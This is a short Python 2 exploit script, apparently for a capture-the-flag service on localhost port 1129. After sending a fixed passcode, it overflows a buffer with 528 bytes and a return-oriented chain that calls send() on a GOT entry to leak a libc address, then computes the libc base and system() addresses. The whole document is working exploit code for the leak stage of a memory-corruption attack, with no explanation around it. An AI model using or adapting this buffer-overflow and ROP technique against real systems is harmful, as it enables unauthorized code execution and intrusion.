from struct import *
from socket import *
from time import *

p = lambda x : pack("<L", x)
up = lambda x : unpack("<L",x)[0]

passcode = "in the end, I was there."
recv_plt = 0x80488e0
recv_got = 0x804b074
send_plt = 0x8048900
send_got = 0x804b07c
pop4ret = 0x804917c
offset = 0x188a50

print "=============== [ Libc Leak ] ==============="
s = socket(AF_INET, SOCK_STREAM)
s.connect(("localhost", 1129))
print s.recv(1024)
print s.recv(1024)
payload = "A"*528
payload += p(send_plt)
payload += p(pop4ret)
payload += p(4)
payload += p(send_got)
payload += p(4)
payload += p(0)


s.send("launch\n")
print s.recv(1024)

s.send(passcode + "\n")
print s.recv(1024)
print s.recv(1024)

s.send(payload + "\n")

got = up(s.recv(4))
print "Send_GOT : " + hex(got)
libc_base = got - 0xf390
print "Libc_base(pthread) : " + hex(libc_base)
system_libc = got - offset
print "System_libc : " + hex(system_libc)
sleep(3)
s.close()